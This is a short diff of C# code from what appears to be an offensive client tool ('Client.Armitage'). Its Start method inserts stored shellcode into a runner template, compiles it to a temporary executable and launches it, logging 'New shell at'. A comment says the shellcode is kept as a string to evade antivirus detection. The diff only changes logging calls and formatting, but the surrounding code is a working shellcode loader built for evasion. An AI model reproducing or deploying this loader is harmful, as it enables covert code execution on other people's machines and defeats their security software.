@@ -17,7 +17,7 @@ namespace Client.Armitage
 
         /// It's necessary to put the ShellCode in string to prevent AV detection.
         /// To generate one, see: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
-        /// Currently useless because AntiVirus detects
+        /// Currently disabled because AntiVirus detects
         public static void Start()
         {
             string temppath = Utilities.Filepath.GetTempExePath();
@@ -25,16 +25,17 @@ namespace Client.Armitage
             string code = Properties.Resources.ShellCode_Runner.Replace(
                 "[SHELLCODE]", Properties.Resources.ShellCode);
        
-            Console.WriteLine(code);
+            Debug.WriteLine(code);
 
             Compiler compiler = new Compiler(
                 new string[] {
-                    "mscorlib.dll", "System.Core.dll",
+                    "mscorlib.dll", 
+                    "System.Core.dll",
                     "System.dll"
                 }, temppath);
             compiler.CompileCode(code);
 
-            Console.WriteLine("New shell at: " + temppath);
+            Debug.WriteLine("New shell at: " + temppath);
 
             Process.Start(temppath);
         }
